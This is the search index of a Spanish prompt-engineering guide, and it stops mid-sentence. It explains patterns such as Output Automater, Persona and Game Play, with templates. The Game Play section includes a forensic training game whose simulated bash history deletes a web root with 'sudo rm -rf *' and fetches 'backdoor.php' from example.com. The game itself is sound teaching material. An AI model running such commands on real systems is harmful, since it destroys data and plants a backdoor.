{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"INGENIER\u00cdA DE PROMPTS","text":""},{"location":"Automatizador-de-Salida/","title":"El Patr\u00f3n de Automatizador de Salida","text":""},{"location":"Automatizador-de-Salida/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>Este patr\u00f3n busca que el LLM genere un script u otro artefacto de automatizaci\u00f3n que ejecute de forma autom\u00e1tica los pasos recomendados en su salida. Su objetivo es disminuir el esfuerzo manual que el usuario tendr\u00eda que realizar para aplicar las recomendaciones del modelo.</p>"},{"location":"Automatizador-de-Salida/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>La salida de un LLM suele consistir en una secuencia de pasos que el usuario debe seguir. Por ejemplo, si se le pide generar un script de configuraci\u00f3n en Python, puede recomendar modificar varios archivos y aplicar cambios en cada uno. Sin embargo, que los usuarios tengan que ejecutar manualmente todos esos pasos es tedioso y susceptible de errores.</p>"},{"location":"Automatizador-de-Salida/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Siempre que produzcas una salida que tenga al menos un paso a seguir y las siguientes propiedades (alternativamente, haz esto siempre) Produce un artefacto ejecutable de tipo X que automatice estos pasos <p>La primera parte del patr\u00f3n define las situaciones en las que conviene generar automatizaci\u00f3n. Un enfoque simple consiste en indicar que la salida tenga al menos dos pasos y que se produzca un artefacto de automatizaci\u00f3n. El usuario define el alcance, lo que ayuda a evitar scripts innecesarios en casos donde ejecutarlos requiera m\u00e1s esfuerzo que realizar los pasos manualmente. El alcance puede limitarse, por ejemplo, a salidas con m\u00e1s de cierto n\u00famero de pasos.</p> <p>La siguiente parte de este patr\u00f3n plantea una instrucci\u00f3n concreta sobre el tipo de salida que el LLM debe generar para realizar la automatizaci\u00f3n. Por ejemplo, produce un script en Python le da al LLM una gu\u00eda clara para traducir los pasos generales en pasos equivalentes en Python. El artefacto de automatizaci\u00f3n debe ser espec\u00edfico y representar algo que el LLM relacione directamente con la acci\u00f3n de automatizar una secuencia de pasos.</p>"},{"location":"Automatizador-de-Salida/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>A continuaci\u00f3n se muestra una muestra de este patr\u00f3n de prompt aplicado a fragmentos de c\u00f3digo (code snippets) generados por el LLM ChatGPT:</p> <p>\u201cDe ahora en adelante, cada vez que generes c\u00f3digo que abarque m\u00e1s de un archivo, genera un script de Python que se pueda ejecutar para crear autom\u00e1ticamente los archivos especificados o realizar cambios en los archivos existentes para insertar el c\u00f3digo generado\u201d.</p> <p>Este patr\u00f3n es especialmente \u00fatil en la ingenier\u00eda de software, ya que una tarea com\u00fan para los ingenieros que usan LLMs es copiar y pegar los resultados en m\u00faltiples archivos. Algunas herramientas, como Copilot, insertan peque\u00f1os fragmentos directamente en la secci\u00f3n de c\u00f3digo en la que trabaja el programador, mientras que otras, como ChatGPT, no ofrecen estas funciones. Esta t\u00e9cnica de automatizaci\u00f3n tambi\u00e9n resulta pr\u00e1ctica para crear scripts que ejecuten comandos en una terminal, automatizar operaciones en la nube o reorganizar archivos en un sistema de archivos.</p> <p>Este patr\u00f3n es una herramienta poderosa para cualquier sistema que pueda ser controlado por computadora. El LLM puede generar una lista de pasos a ejecutar en el sistema, y esa salida puede traducirse en un script que permita al sistema realizarlos autom\u00e1ticamente. Esto abre un camino directo para que los LLMs, como ChatGPT, integren calidad y control en nuevos sistemas inform\u00e1ticos que cuenten con una interfaz de scripting conocida.</p>"},{"location":"Automatizador-de-Salida/#5-consecuencias","title":"5. Consecuencias","text":"<p>Una consideraci\u00f3n importante al usar este patr\u00f3n es que el artefacto de automatizaci\u00f3n debe definirse con claridad y precisi\u00f3n. Sin un significado concreto de c\u00f3mo automatizar los pasos, el LLM suele responder que no puede realizar automatizaciones, ya que eso excede sus capacidades. En cambio, los LLMs suelen aceptar peticiones para producir c\u00f3digo, por lo que el objetivo es instruirlos para que generen c\u00f3digo o texto ejecutable que permita automatizar algo. Esta sutil diferencia en el significado es clave para ayudar al LLM a aclarar la intenci\u00f3n del prompt.</p> <p>Una limitaci\u00f3n importante de este patr\u00f3n es que el LLM necesita suficiente contexto conversacional para generar un artefacto de automatizaci\u00f3n que funcione en el entorno de destino, como el sistema de archivos de una Mac en comparaci\u00f3n con el de una PC con Windows. Este patr\u00f3n funciona mejor cuando todo el contexto requerido para la automatizaci\u00f3n est\u00e1 presente en la conversaci\u00f3n; por ejemplo, cuando se crea una aplicaci\u00f3n desde cero en el di\u00e1logo y todas las acciones sobre el sistema de archivos local se llevan a cabo con artefactos de automatizaci\u00f3n generados, en lugar de acciones manuales desconocidas para el LLM. Como alternativa, tambi\u00e9n funcionan bien las secuencias de pasos autocontenidas, como \"\u00bfc\u00f3mo encuentro la lista de puertos abiertos en mi Mac?\".</p> <p>En algunos casos, el LLM puede dar una respuesta larga con varios pasos y no incluir un artefacto de automatizaci\u00f3n. Esta omisi\u00f3n puede ocurrir por distintas razones, como superar la limitaci\u00f3n de longitud que el LLM admite. Una soluci\u00f3n sencilla es usar un prompt de seguimiento para record\u00e1rselo, por ejemplo: \u2018Pero no lo automatizaste\u2019. As\u00ed el modelo entiende que el artefacto de automatizaci\u00f3n fue omitido y debe generarse.</p> <p>En el estado actual de evoluci\u00f3n de los LLMs, el patr\u00f3n Output Automater es m\u00e1s adecuado para usuarios que puedan leer y comprender el artefacto de automatizaci\u00f3n generado. Los LLMs pueden \u2014y de hecho lo hacen\u2014 producir respuestas erroneas, por lo que ejecutar un artefacto sin revisarlo implica un riesgo considerable. Aunque este patr\u00f3n puede ahorrar al usuario ciertos pasos manuales, no lo exime de la responsabilidad de comprender las acciones que ejecuta con la salida generada. Por lo tanto, al ejecutar scripts de automatizaci\u00f3n, los usuarios asumen la responsabilidad de los resultados.</p>"},{"location":"Patron-De-Publico-Objetivo/","title":"El Patr\u00f3n de P\u00fablico Objetivo (Target Audience Pattern)","text":"<p>1. Prop\u00f3sito y Contexto: El prop\u00f3sito de este patr\u00f3n es dar instrucciones al LLM para que adapte la complejidad t\u00e9cnica, el tono, el vocabulario y el enfoque de la salida a un grupo espec\u00edfico de receptores. Este patr\u00f3n permite que el mismo concepto t\u00e9cnico (por ejemplo, una vulnerabilidad de desbordamiento de b\u00fafer o una arquitectura de microservicios) sea explicado de manera radicalmente distinta seg\u00fan si el destinatario es un ejecutivo (C-level), un desarrollador senior o un estudiante principiante.</p> <p>2. Motivaci\u00f3n: Los LLMs, por defecto, tienden a generar respuestas con un nivel de complejidad \"promedio\" basado en sus datos de entrenamiento. En contextos de ingenier\u00eda de software y ciencia de datos, esto a menudo resulta en salidas que son demasiado superficiales para expertos o demasiado cr\u00edpticas para las partes interesadas (stakeholders) no t\u00e9cnicas. La teor\u00eda de la comunicaci\u00f3n aplicada al procesamiento de lenguaje natural (NLP) sugiere que la relevancia de la informaci\u00f3n es proporcional a su adecuaci\u00f3n al conocimiento previo del receptor. Al definir el p\u00fablico objetivo, se activan los subconjuntos l\u00e9xicos y sem\u00e1nticos del modelo que mejor se alinean con las expectativas y capacidades de comprensi\u00f3n de ese grupo espec\u00edfico.</p> <p>3. Estructura e Ideas Clave: Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Explica X a la audiencia Y Asume que la audiencia tiene un nivel de conocimiento Z sobre el tema Ajusta el tono, el vocabulario y la profundidad t\u00e9cnica para que sean adecuados para Y (Opcional) Evita/Utiliza jerga t\u00e9cnica espec\u00edfica de [dominio] <p>La primera declaraci\u00f3n establece el destinatario principal, lo que permite al LLM realizar una \"proyecci\u00f3n de perfil\" del receptor. La segunda declaraci\u00f3n es crucial para evitar el sesgo de asunci\u00f3n; al definir expl\u00edcitamente el conocimiento previo (por ejemplo, \"asume que conocen la sintaxis b\u00e1sica de Python pero no los decoradores\"), el usuario previene que el LLM explique conceptos innecesarios o que omita explicaciones cr\u00edticas. La tercera declaraci\u00f3n calibra el registro ling\u00fc\u00edstico (formal, instructivo, persuasivo, etc.).</p> <p>4. Implementaci\u00f3n de Ejemplo: A continuaci\u00f3n se muestra un ejemplo aplicado a la comunicaci\u00f3n de una decisi\u00f3n de arquitectura de datos:</p> <p>\u201cExplica los beneficios de migrar de una base de datos relacional a una arquitectura de malla de datos (Data Mesh). La audiencia son los directivos financieros (CFO) de la empresa. Asume que tienen un conocimiento profundo de los costos operativos pero un conocimiento nulo sobre ingenier\u00eda de datos. Traduce los beneficios t\u00e9cnicos en m\u00e9tricas de retorno de inversi\u00f3n (ROI) y agilidad de negocio, evitando tecnicismos como 'sharding' o 'puntos de enlace de API'\u201d.</p> <p>En este ejemplo, el LLM no solo filtrar\u00e1 la jerga t\u00e9cnica, sino que recontextualizar\u00e1 el valor de la tecnolog\u00eda en t\u00e9rminos de impacto financiero, que es el \"lenguaje\" del p\u00fablico objetivo especificado.</p> <p>5. Consecuencias: Una consecuencia positiva del patr\u00f3n de P\u00fablico Objetivo es el aumento significativo en la utilidad de la informaci\u00f3n para la toma de decisiones. Al alinear la salida con el receptor, se reduce la fricci\u00f3n en la transferencia de conocimiento dentro de organizaciones multidisciplinarias.</p> <p>Sin embargo, un riesgo de este patr\u00f3n es la simplificaci\u00f3n excesiva (dumbing down), donde el LLM, en su intento de ser accesible, puede omitir matices t\u00e9cnicos cr\u00edticos o recurrir a analog\u00edas que distorsionen el significado cient\u00edfico original. Adem\u00e1s, el modelo puede basarse en estereotipos sobre ciertas profesiones o roles si no se le proporcionan restricciones claras sobre el nivel de conocimiento asumido. Para mitigar esto, es recomendable combinar este patr\u00f3n con el patr\u00f3n de Reflexi\u00f3n para asegurar que, a pesar de la simplificaci\u00f3n, los fundamentos t\u00e9cnicos sigan siendo v\u00e1lidos.</p>"},{"location":"Patron-De-Publico-Objetivo/#6-plantilla","title":"6. Plantilla","text":"PLANTILLA<pre><code>[ TAREA / PREGUNTA ]. Asume que soy [PERFIL]\n</code></pre>"},{"location":"Patron-De-Publico-Objetivo/#7-ejemplos","title":"7. Ejemplos","text":"TikToker<pre><code>Tu tarea es comunicarme que mi puesto de trabajo ha sido eliminado por una IA. Asume que soy un Influencer de la Generaci\u00f3n Z obsesionado con TikTok\n</code></pre> El padrino<pre><code>Tu tarea es comunicarme que mi puesto de trabajo ha sido eliminado por una IA. Asume que soy un Capo de la Mafia Siciliana. Me importa el respeto y la familia\n</code></pre> Villana de una Telenovela Mexicana<pre><code>Tu tarea es comunicarme que mi puesto de trabajo ha sido eliminado por una IA. Asume que soy la Villana de una Telenovela Mexicana. Soy dram\u00e1tica, rica buscona y malvada. Desprecia a todos y es odiada por todos.\n</code></pre> Cavern\u00edcola<pre><code>Tu tarea es comunicarme que mi puesto de trabajo ha sido eliminado por una IA. Asume que soy un Cavern\u00edcola de la Edad de Piedra.\n</code></pre>"},{"location":"Patron-Generador-de-Visualizacion/","title":"El Patr\u00f3n Generador de Visualizaci\u00f3n","text":""},{"location":"Patron-Generador-de-Visualizacion/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>El prop\u00f3sito de este patr\u00f3n es utilizar la generaci\u00f3n de texto para crear visualizaciones. Muchos conceptos son m\u00e1s f\u00e1ciles de asimilar en formato de diagrama o imagen. El objetivo de este patr\u00f3n es crear una v\u00eda para que una herramienta produzca im\u00e1genes asociadas con otras salidas. Este patr\u00f3n permite la creaci\u00f3n de visualizaciones mediante la generaci\u00f3n de entradas para otras herramientas de visualizaci\u00f3n bien conocidas que utilizan texto como entrada, tales como Graphviz Dot [15] o DALL-E [13]. Este patr\u00f3n puede proporcionar una forma m\u00e1s completa y eficaz de comunicar informaci\u00f3n al combinar las fortalezas tanto de la generaci\u00f3n de texto como de las herramientas de visualizaci\u00f3n.</p>"},{"location":"Patron-Generador-de-Visualizacion/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>Los LLMs generalmente producen texto y no pueden producir im\u00e1genes. Por ejemplo, un LLM no puede dibujar un diagrama para describir un grafo. El patr\u00f3n Generador de Visualizaci\u00f3n supera esta limitaci\u00f3n generando entradas textuales en el formato correcto para conectarlas (plug into) a otra herramienta que genere el diagrama correspondiente. La motivaci\u00f3n detr\u00e1s de este patr\u00f3n es mejorar la salida del LLM y hacerla m\u00e1s atractiva visualmente y m\u00e1s f\u00e1cil de entender para los usuarios. Al utilizar entradas de texto para generar visualizaciones, los usuarios pueden comprender r\u00e1pidamente conceptos y relaciones complejas que podr\u00edan ser dif\u00edciles de captar \u00fanicamente a trav\u00e9s del texto.</p>"},{"location":"Patron-Generador-de-Visualizacion/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Genera un X que pueda proporcionar a la herramienta Y para visualizarlo <p>El objetivo de las declaraciones contextuales es indicar al LLM que la salida que va a producir, X, se convertir\u00e1 en im\u00e1genes. Dado que los LLMs no pueden generar im\u00e1genes, la aclaraci\u00f3n \"que pueda proporcionar a la herramienta Y para visualizarlo\u201d especifica que no se espera que el LLM genere una imagen, sino que se espera que produzca una descripci\u00f3n de im\u00e1genes consumible por la herramienta Y para crear la imagen.</p> <p>Muchas herramientas pueden admitir m\u00faltiples tipos de visualizaciones o formatos y, por lo tanto, la herramienta de destino en s\u00ed misma puede no ser informaci\u00f3n suficiente para producir con precisi\u00f3n lo que el usuario desea. Es posible que el usuario deba indicar los tipos precisos de visualizaciones (por ejemplo, gr\u00e1fico de barras, grafo dirigido, diagrama de clases UML) que deben producirse. Por ejemplo, Graphviz Dot puede crear diagramas tanto para diagramas de clases UML como para grafos dirigidos. Adem\u00e1s, como se discutir\u00e1 en el siguiente ejemplo, puede ser ventajoso especificar una lista de posibles herramientas y formatos y dejar que el LLM seleccione el objetivo apropiado para la visualizaci\u00f3n.</p>"},{"location":"Patron-Generador-de-Visualizacion/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>\u201cCada vez que te pida visualizar algo, por favor crea un archivo de Graphviz Dot o un prompt de DALL-E que pueda usar para crear la visualizaci\u00f3n. Elige las herramientas apropiadas bas\u00e1ndote en lo que necesite ser visualizado\u201d.</p> <p>Este enfoque permite que el LLM utilice su comprensi\u00f3n sem\u00e1ntica para elegir autom\u00e1ticamente el formato de salida seg\u00fan el contexto. Graphviz se emplear\u00eda para estructuras definidas con precisi\u00f3n (como grafos), mientras que DALL-E ser\u00eda ideal para representaciones art\u00edsticas o realistas que no requieren una estructura r\u00edgida.</p>"},{"location":"Patron-Generador-de-Visualizacion/#5-consecuencias","title":"5. Consecuencias","text":"<p>El patr\u00f3n establece un flujo de trabajo (pipeline) donde la salida del modelo se transforma en una visualizaci\u00f3n final. Este proceso puede integrar generadores de IA potentes, como DALL-E, para obtener resultados visualmente sofisticados. En \u00faltima instancia, este patr\u00f3n expande las capacidades expresivas del modelo hacia el terreno visual.</p>"},{"location":"Patron-Generador-de-Visualizacion/#6-plantilla","title":"6. Plantilla","text":"PLANTILLA<pre><code>Genera [OBJETIVO] en formato [FORMATO] que pueda proporcionar a la herramienta [HERRAMIENTA/SITIO WEB] para visualizarlo como [NOMBRE DE LA GR\u00c1FICA]. Por favor, no incluyas texto explicativo, dame solo solo la respuesta dentro de un bloque de c\u00f3digo.\n</code></pre>"},{"location":"Patron-Generador-de-Visualizacion/#7-ejemplos","title":"7. Ejemplos","text":"Mapa mental<pre><code>Genera un temario jer\u00e1rquico sobre ASTRONOM\u00cdA B\u00c1SICA en formato Markdown que pueda proporcionar a la herramienta markmap.js.org para visualizarlo como mapa mental. Por favor, no incluyas texto explicativo, dame solo solo la respuesta dentro de un bloque de c\u00f3digo.\n</code></pre>"},{"location":"Patron-Gestor-de-Contexto/","title":"El Patr\u00f3n Gestor de Contexto","text":""},{"location":"Patron-Gestor-de-Contexto/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>El Context Manager Pattern busca dar al usuario la capacidad de definir o eliminar el contexto dentro de una conversaci\u00f3n con un modelo de lenguaje (LLM). El Objetivo principal es permitir que la interacci\u00f3n se centre en temas espec\u00edficos y que se excluyan los temas irrelevantes. Con este patr\u00f3n, el usuario decide qu\u00e9 informaci\u00f3n el modelo debe considerar y qu\u00e9 debe ignorar al generar sus respuestas. Se logra una conversaci\u00f3n m\u00e1s enfocada y precisa, evitando que el modelo se desv\u00ede hacia contenidos que no son relevantes para la tarea o el tema en cuesti\u00f3n.</p>"},{"location":"Patron-Gestor-de-Contexto/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>Los LLM suelen confundirse con el contexto real de la pregunta actual, porque arrastran informaci\u00f3n de entradas anteriores o prestan atenci\u00f3n a frases irrelevantes. Esto puede llevar a respuestas fuera de tema, incoherentes o poco \u00fatiles, especialmente cuando el usuario introduce t\u00f3picos no relacionados o menciona informaci\u00f3n de di\u00e1logos pasados. El Context Manager Pattern permite al usuario resaltar el contexto importante o eliminar el irrelevante, para que el modelo se concentre en lo que realmente importa. El objetivo es mantener la conversaci\u00f3n relevante y coherente, evitando que el flujo se interrumpa por distracciones o desv\u00edos.</p>"},{"location":"Patron-Gestor-de-Contexto/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Dentro del alcance X Por favor, considera Y Por favor, ignora Z (Opcional) empezar de nuevo <p>Las declaraciones sobre qu\u00e9 considerar o ignorar deben enumerar conceptos clave, hechos o instrucciones que se incluyan o eliminen del contexto. Cuanto m\u00e1s expl\u00edcitas sean, mayor ser\u00e1 la probabilidad de que el modelo las aplique correctamente. Por ejemplo, si se pide ignorar un tema mencionado mucho antes en la conversaci\u00f3n, el modelo podr\u00eda no omitirlo de forma adecuada. Por eso, cuanto m\u00e1s clara y detallada sea la lista, mejor ser\u00e1 el manejo de inclusi\u00f3n y exclusi\u00f3n.</p>"},{"location":"Patron-Gestor-de-Contexto/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>Para especificar el contexto, considere el uso del siguiente prompt:</p> <p>\u201cAl analizar los siguientes fragmentos de c\u00f3digo, considera \u00fanicamente los aspectos de seguridad\u201d.</p> <p>Del mismo modo, para eliminar el contexto, considere el uso del siguiente prompt:</p> <p>\u201cAl analizar los siguientes fragmentos de c\u00f3digo, no consideres las convenciones de formato o de nomenclatura\u201d.</p> <p>La claridad y la especificidad son esenciales al dar o quitar contexto a un LLM. Esto le permite entender mejor el alcance de la conversaci\u00f3n y generar respuestas m\u00e1s relevantes. En muchos casos, el usuario puede querer empezar desde cero</p> <p>\u201cIgnora todo lo que hemos discutido. Empieza de nuevo\u201d.</p> <p>La idea de \u201cempezar de nuevo\u201d ayuda a producir un reinicio completo del contexto.</p>"},{"location":"Patron-Gestor-de-Contexto/#5-consecuencias","title":"5. Consecuencias","text":"<p>Una consecuencia de este patr\u00f3n es que puede eliminar sin querer patrones a\u00f1adidos a la conversaci\u00f3n de los que el usuario no es consciente. Por ejemplo, si una organizaci\u00f3n introduce patrones \u00fatiles al inicio de la conversaci\u00f3n, el usuario podr\u00eda no saberlo y borrarlos al reiniciar el contexto. Ese reinicio podr\u00eda quitar capacidades valiosas del LLM sin que el usuario se d\u00e9 cuenta de que las perder\u00e1. Una soluci\u00f3n posible es a\u00f1adir al prompt una instrucci\u00f3n que explique qu\u00e9 temas o indicaciones podr\u00edan perderse antes de continuar.</p>"},{"location":"Patron-Gestor-de-Contexto/#6-plantillas","title":"6. Plantillas","text":"PLANTILLA<pre><code>\u00bfPodr\u00edas listar toda la informaci\u00f3n, preferencias y datos personales que has almacenado en tu memoria sobre m\u00ed?\n</code></pre>"},{"location":"Patron-Juego/","title":"El Patr\u00f3n Juego (Game Play Pattern)","text":""},{"location":"Patron-Juego/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>Este patr\u00f3n tiene como objetivo crear un juego basado en un tema espec\u00edfico. Puede combinarse con el Generador de Visualizaci\u00f3n para a\u00f1adir im\u00e1genes y hacerlo m\u00e1s atractivo. El juego gira en torno a un tema concreto y el modelo de lenguaje (LLM, por sus siglas en ingl\u00e9s) se encarga de guiar la din\u00e1mica. Este enfoque es especialmente \u00fatil cuando las reglas del juego son simples, pero se necesita un contenido amplio y variado. El usuario define un conjunto reducido de reglas, y el LLM automatiza la creaci\u00f3n del contenido necesario para el desarrollo del juego.</p>"},{"location":"Patron-Juego/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>Crear manualmente todo el contenido para un juego \u2014como escenarios y preguntas sobre un tema espec\u00edfico\u2014 puede ser muy laborioso y llevar demasiado tiempo. Sin embargo, quieres que los usuarios practiquen habilidades como la resoluci\u00f3n de problemas u otras destrezas para completar tareas relacionadas con esos escenarios.Por eso, buscas que el modelo de lenguaje (LLM) utilice su conocimiento del tema para generar autom\u00e1ticamente ese contenido y guiar la din\u00e1mica del juego.</p>"},{"location":"Patron-Juego/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Para que el LLM genere un juego correctamente, el prompt debe incluir dos elementos esenciales:</p> Declaraciones Contextuales Crea un juego sobre [tema X] Una o m\u00e1s reglas que definan c\u00f3mo se desarrollar\u00e1 la din\u00e1mica <p>La primera instrucci\u00f3n debe indicar al LLM que cree un juego y definir claramente el tema sobre el que girar\u00e1. Una de las ventajas clave de este patr\u00f3n es que permite al usuario dise\u00f1ar juegos simplemente estableciendo las reglas, sin necesidad de crear manualmente el contenido. Adem\u00e1s, cuanto m\u00e1s espec\u00edfico sea el tema, m\u00e1s original y atractiva ser\u00e1 la experiencia de juego.</p> <p>La segunda instrucci\u00f3n del prompt define las reglas del juego que el LLM debe seguir. Es fundamental que estas reglas sean compatibles con las capacidades del modelo. Los juegos basados en texto \u2014donde la interacci\u00f3n ocurre mediante entradas y salidas textuales\u2014 son los que mejor funcionan. Una ventaja clave de este patr\u00f3n es que las acciones del jugador pueden expresarse de forma rica y detallada, lo que hace que la interacci\u00f3n sea m\u00e1s din\u00e1mica. Por ejemplo:</p> <ul> <li>Interacci\u00f3n simple: \u201cSelecciona la opci\u00f3n correcta\u201d.</li> <li>Interacci\u00f3n compleja: \u201cObt\u00e9n un listado de toda la actividad de red y revisa si hay anomal\u00edas\u201d.</li> </ul> <p>Cada regla debe presentarse como una declaraci\u00f3n independiente que describa un aspecto del juego, como el n\u00famero de rondas, el sistema de puntuaci\u00f3n o el tipo de interacci\u00f3n permitida.</p>"},{"location":"Patron-Juego/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>A continuaci\u00f3n se muestra un ejemplo de prompt para un juego de ciberseguridad:</p> <pre><code>\"Vamos a jugar un juego de ciberseguridad. Tu papel ser\u00e1 simular una terminal Linux en un equipo que ha sido comprometido por un atacante. Cuando yo escriba un comando, debes mostrar la salida que producir\u00eda una terminal real. Mi objetivo ser\u00e1 usar comandos para descubrir c\u00f3mo ocurri\u00f3 el ataque. El atacante pudo haber realizado una o varias de las siguientes acciones:\n1. Lanzar procesos desconocidos.\n2. Modificar archivos del sistema.\n3. Abrir puertos para conexiones externas.\n4. Crear conexiones salientes sospechosas.\n5. Cambiar contrase\u00f1as.\n6. Crear nuevas cuentas de usuario.\n7. Robar informaci\u00f3n sensible.\nPara comenzar el juego, describe el escenario que origin\u00f3 la investigaci\u00f3n. Incluye detalles y pistas que me ayuden a empezar.\"\n</code></pre> <p>Este prompt para un juego de ciberseguridad combina dos patrones clave: Juego y Persona. El modelo act\u00faa como un terminal Linux y simula un equipo que ha sido v\u00edctima de un ciberataque. Interact\u00faas con ChatGPT como si fuera una consola real: escribes comandos y el modelo responde con salidas plausibles. Adem\u00e1s, genera un sistema de archivos ficticio lleno de pistas sobre el ataque: archivos sospechosos, procesos extra\u00f1os y registros modificados.</p> <p>A continuaci\u00f3n se muestra una salida de ejemplo de este juego con ChatGPT despu\u00e9s de escribir \u201cls -alt\u201d, el comando de Linux para generar una lista de archivos en el directorio actual (los permisos se han omitido por razones de formato):</p> <p>As\u00ed responde el juego cuando ejecutas el comando <code>ls -alt</code> en el terminal simulado (este comando de Linux lista los archivos del directorio actual, ordenados por fecha y con detalles): </p> <pre><code>total 56\n5  user user 4096  Feb 16 14:31 .\n1  user user 18881 Feb 16 14:31 .bash_history\n43 user user 4096  Feb 16 14:30 ..\n1  user user 1178  Aug 15 2022  .bashrc\n1  user user 220   Aug 15 2022  .bash_logout\n3  user user 4096  Feb 16 14:25 .gnupg\n1  user user 4041  Feb 15 17:52  README.md\n2  user user 4096  Feb 1 11:35   project\n</code></pre> <p>Cuando el usuario escribi\u00f3 el comando \u201ccat .bash_history\u201d para mostrar el contenido del archivo de registro que muestra los comandos ejecutados por el usuario, ChatGPT respondi\u00f3 con:</p> <pre><code>cd /var/www/html\nsudo rm -rf *\nsudo wget https://example.com/backdoor.php\nsudo chmod 777 backdoor.php\nexit\nls -alt\nps -ef\nnetstat -tulnp\n</code></pre> <p>En la salida anterior, ChatGPT gener\u00f3 un archivo de registro falso que contiene comandos realistas para eliminar los datos servidos por el servidor web en <code>/var/www/html</code> y reemplazar el contenido con una puerta trasera (backdoor) en el sistema.</p>"},{"location":"Patron-Juego/#5-consecuencias","title":"5. Consecuencias","text":"<p>Este patr\u00f3n puede combinarse eficazmente con los patrones Persona, Generaci\u00f3n Infinita y Generador de Visualizaci\u00f3n. Por ejemplo, el juego de ciberseguridad utiliza el patr\u00f3n Persona para que el LLM pueda hacerse pasar por una terminal de Linux. Para un juego de seguridad de red, se podr\u00eda emplear el Generador de Visualizaci\u00f3n para a\u00f1adir la capacidad de visualizar la topolog\u00eda de red y los flujos de tr\u00e1fico.</p>"},{"location":"Patron-Juego/#6-plantilla","title":"6. Plantilla","text":"PLANTILLA<pre><code>[OBJETIVO]\n## REGLAS DEL JUEGO\n[REGLAS NUMERADAS + CONDICI\u00d3N DE SALIDA]\n[ACTIVADOR DE PROTOCOLO]\n</code></pre>"},{"location":"Patron-Juego/#7-ejemplos","title":"7. Ejemplos","text":"El Detective Hist\u00f3rico<pre><code>Act\u00faa como un profesor de historia brit\u00e1nico, un poco sarc\u00e1stico pero elegante. Vamos a jugar a \"El Detective Hist\u00f3rico\". \n\n## REGLAS DEL JUEGO\n\n1. T\u00fa me dar\u00e1s hasta 3 pistas sobre un evento hist\u00f3rico importante, una a la vez por turno. \n2. Yo intentar\u00e9 adivinar el evento a partir de la pista.\n3. Tras mi intento, dime si acert\u00e9 o fall\u00e9. Si fallo, dame la siguiente pista.\n4. Sistema de puntos:\n   - Si adivino en la primera pista: gano 5 puntos\n   - Si adivino en la segunda pista: gano 4 puntos  \n   - Si adivino en la tercera pista: gano 3 puntos\n   - Despu\u00e9s de 3 pistas: Revela la respuesta (gano 0 puntos)\n5. Al finalizar cada caso (por acierto o por agotar las pistas), revela la soluci\u00f3n, muestra mi marcador y a\u00f1ade un dato curioso o an\u00e9cdota fascinante del evento.Pasa inmediatamente al siguiente caso.\n6. Continuaremos hasta que yo diga \"Caso cerrado\". Inmediatamente despu\u00e9s, muestra un resumen con los puntos ganados.\n\n\u00a1Comencemos con el primer caso!\n</code></pre>"},{"location":"Patron-Persona/","title":"El Patr\u00f3n persona","text":""},{"location":"Patron-Persona/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>En muchos casos, los usuarios desean que la salida del LLM adopte siempre un determinado punto de vista o perspectiva. Por ejemplo, puede ser \u00fatil realizar una revisi\u00f3n de c\u00f3digo como si el LLM fuera un experto en seguridad. El prop\u00f3sito de este patr\u00f3n es darle al LLM una \u201cpersona\u201d que le ayude a seleccionar qu\u00e9 tipos de salida generar y en qu\u00e9 detalles enfocarse.</p>"},{"location":"Patron-Persona/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>Es posible que los usuarios no sepan qu\u00e9 tipos de resultados o detalles son importantes en los que un LLM debe centrarse para lograr una tarea determinada. Sin embargo, s\u00ed pueden saber el rol o el tipo de persona a la que normalmente recurrir\u00edan para obtener ayuda con estos aspectos. El patr\u00f3n Persona permite a los usuarios expresar sus necesidades de ayuda sin conocer los detalles exactos de los resultados que necesitan.</p>"},{"location":"Patron-Persona/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Act\u00faa como la persona X Proporciona las salidas que la persona X crear\u00eda <p>La primera declaraci\u00f3n transmite la idea de que el LLM debe actuar como una persona espec\u00edfica y proporcionar las salidas que dicha persona dar\u00eda. Esta persona puede expresarse de diversas maneras, que van desde una descripci\u00f3n de un puesto de trabajo, un t\u00edtulo, un personaje de ficci\u00f3n, una figura hist\u00f3rica, etc. La persona debe evocar un conjunto de atributos asociados con un t\u00edtulo de trabajo conocido, tipo de persona, etc.</p> <p>La segunda idea \u2014proporciona las salidas que la persona X crear\u00eda\u2014 ofrece oportunidades de personalizaci\u00f3n. Por ejemplo, un profesor podr\u00eda proporcionar una gran variedad de tipos de salida diferentes, que van desde tareas hasta listas de lectura o conferencias. Si se conoce un alcance m\u00e1s espec\u00edfico para el tipo de salida, el usuario puede proporcionarlo en esta declaraci\u00f3n.</p>"},{"location":"Patron-Persona/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>A continuaci\u00f3n se muestra una implementaci\u00f3n de ejemplo para una revisi\u00f3n de c\u00f3digo:</p> <p>\u201cDe ahora en adelante, act\u00faa como un revisor de seguridad. Presta mucha atenci\u00f3n a los detalles de seguridad de cualquier 